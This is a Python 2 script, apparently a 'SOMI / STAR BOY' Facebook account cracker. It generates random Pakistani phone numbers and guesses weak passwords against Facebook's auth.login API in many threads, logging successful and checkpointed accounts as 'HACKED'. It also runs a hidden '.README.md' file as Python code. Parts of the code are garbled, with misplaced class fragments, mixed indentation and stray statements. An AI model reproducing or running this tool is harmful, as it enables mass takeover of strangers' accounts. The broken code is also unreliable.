#!/usr/bin/python2
# coding=utf-8
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(40000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit Successfully'
    os.sys.exit()


def exxb():
    print '[!] \x1b[1;91mTHIS OPTION NOT AVAILABLE AT THE MOMENT.BUT \x1b[3;92;40m COM\x1b[1;95mING SO\x1b[1;97mON \x1b[1;91m\x1b[0;34;40m'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = [
     '\033[1;31m[\033[1;37m#################\033[1;31m]  \033[1;37m0% ', '\033[1;31m[\033[1;34m#####\033[1;37m############\033[1;31m] \033[1;37m40% ', '\033[1;31m[\033[1;34m##########\033[1;37m#######\033[1;31m] \033[1;37m60% ', '\033[1;31m[\033[1;34m###########\033[1;37m######\033[1;31m] \033[1;37m70% ', '\033[1;31m[\033[1;34m#############\033[1;37m####\033[1;31m] \033[1;37m80% ', '\033[1;31m[\033[1;34m###############\033[1;37m##\033[1;31m] \033[1;37m90% ', '\033[1;31m[\033[1;34m#################\033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m     SUCCESS     \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m                 \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m     SUCCESS     \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m                 \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m     SUCCESS     \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m                 \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m     SUCCESS     \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m                 \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m     SUCCESS     \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m                 \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m     SUCCESS     \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m                 \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;37m     SUCCESS     \033[1;31m] \033[1;37m100% ', '\033[1;31m[\033[1;34m#################\033[1;31m] \033[1;37m100% ']
    for o in titik:
    	print '\r\x1b[1;37m    [\033[1;32m+\033[1;37m] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.3)
def lodhirt():
    lodhirt = [
     '\033[1;92m[SOMI BRAND]', '          ', '\033[1;91m[SOMI BRAND]', '          ', '\033[1;92m[SOMI BRAND]', '          ', '\033[1;91m[SOMI BRAND]', '              ', '\033[1;92m[SOMI BRAND]', '          ', '\033[1;91m[SOMI BRAND]', '          ', '\033[1;92m[SOMI BRAND]', '          ', '\033[1;91m[SOMI BRAND]', '              ', '\033[1;92m[SOMI BRAND]', '          ', '\033[1;91m[SOMI BRAND]', '          ', '\033[1;92m[SOMI BRAND]', '          ', '\033[1;91m[SOMI BRAND]', '          ', '\033[1;92m[SOMI BRAND]', '          ', '\033[1;91m[SOMI BRAND]', '          ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND]', '      ', '\033[1;92m[SOMI BRAND]', '      ', '\033[1;91m[SOMI BRAND] ']
    for o in lodhirt:
        print '\r\x1b[1;94m                   \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(1./17)
        

def jaalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(2.0 / 9900)
def exit():
    os.system("exit")
a = "\x1b[1;91m"
c = "\x1b[1;97m"
list = [a,c]
for i in range(1,150):
        warna = random.choice(list)
        try:
    
            
                 sys.stdout.write(warna +"\r                  [SOMI STAR BOY]")
                 sys.stdout.flush()
                 time.sleep(1./17)
        except KeyboardInterrupt:
                print ("\x1b[1;97m")
                exit()


logo = """
           \033[1;92m ######   #######  ##     ## #### 
           \033[1;91m##    ## ##     ## ###   ###  ##  
           \033[1;93m##       ##     ## #### ####  ##  
            \033[1;94m######  ##     ## ## ### ##  ##  
             \033[1;95m    ## ##     ## ##     ##  ##  
           \033[1;96m##    ## ##     ## ##     ##  ##  
           \033[1;92m ######   #######  ##     ## #### 
     

"""
logo1 = """
           \033[1;92m ######   #######  ##     ## #### 
           \033[1;91m##    ## ##     ## ###   ###  ##  
           \033[1;93m##       ##     ## #### ####  ##  
            \033[1;94m######  ##     ## ## ### ##  ##  
             \033[1;95m    ## ##     ## ##     ##  ##  
           \033[1;96m##    ## ##     ## ##     ##  ##  
           \033[1;92m ######   #######  ##     ## #### 

\033[1;47m\033[1;31m          SELECT PAKISTAN SIM CODE          \033[1;0m   
\033[4;97mMOBILINK/JAZZ CODE HERE\033[1;0m
\033[1;91m[\xe2\x97\x8f]\033[1;96m00, 01, 02, 03, 04,
\033[1;91m[\xe2\x97\x8f]\033[1;93m05, 06, 07, 08, 09,
\033[4;97mTELINORE CODE HERE\033[1;0m
\033[1;91m[\xe2\x97\x8f]\033[1;96m40, 41, 42, 43, 44,
\033[1;91m[\xe2\x97\x8f]\033[1;93m45, 46, 47 ,48 ,49,
\033[4;97mWARID CODE HERE\033[1;0m
\033[1;91m[\xe2\x97\x8f]\033[1;96m20, 21, 22, 23,
\033[1;91m[\xe2\x97\x8f]\033[1;93m24, ??, ??, ??,
\033[4;97mUFONE CODE HERE\033[1;0m
\033[1;91m[\xe2\x97\x8f]\033[1;96m31, 32, 33, 34,
\033[1;91m[\xe2\x97\x8f]\033[1;93m35, 36, 37, ??,
\033[4;97mZONG CODE HERE\033[1;0m
\033[1;91m[\xe2\x97\x8f]\033[1;96m10, 11, 12, 13,
\033[1;91m[\xe2\x97\x8f]\033[1;93m14, 15, 16, 17,



"""




back = 0
back = 0
successful = []
cpb = []
oks = []
id = []
self.ko=0
def menu():
    os.system('clear')
    print logo
    print
    exit()
    print 47* '\033[4;94m=\033[1;0m'
    lodhirt()
    print
    jalan('\x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;93mPAKISTAN CRACKING')
    print
    jaalan('\x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;96mUPDATE STAR BOY PROGRAM')
    print
    jaalan('\x1b[1;91m[\x1b[1;92m0\x1b[1;91m] \x1b[1;91mCLOSE PROGRAM ')
    print
    print 47* '\033[4;94m=\033[1;0m'
    action()


def action():
    global oks
    global cpb
    Somi = raw_input('\n\n \x1b[1;96m>>>  ')
    if Somi == '':
        print '[!] STAR BOY WARNING'
        action()
    elif Somi == '1':
        tik()
        os.system('clear')
        print logo1
        print
        try:
            c = raw_input('\033[1;93mCODE\033[1;96m: >>> ')
            k = "+923"
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif Somi == '2':
        tik()
        os.system('clear')
        os.system('pip2 install --upgrade Dream-boy')
        os.system('clear')
        print logo
        print
        psb(' Tool has been successfully updated \n Enjoy with Star boy')
        time.sleep(1)
        os.system('python2 .README.md')
        menu()
    elif Somi== '0':
        exb()
    else:
        print '[!] WARNING STAR BOY'
        action()
    print 47* '\033[1;97m='
    
    print 47* '\033[1;97m='
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;90m[AFTER 7DAYS] \x1b[1;92m  ' + k + c + user + '\x1b[1;94m | \x1b[1;91m' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;90m[AFTER 7DAYS] \x1b[1;92m  ' + k + c + user + '\x1b[1;94m | \x1b[1;91m' + pass2 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                
         
					break
				else:continue
					
			self.ko+=1
			print "\r  \033[1;91m-{\033[1;91mProcess\033[1;91m}--{\033[1;93m%s/\033[1;96m%s}\033[1;92m--{Ok--%s}--\033[1;91m--{Cp--%s}"%(self.ko,len(self.fl),len(self.ada),len(self.cpb)),;sys.stdout.flush()
		except:
			self.main(fl)
       
        
    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
    print '[\xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/checkpoint.txt'
    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    menu()
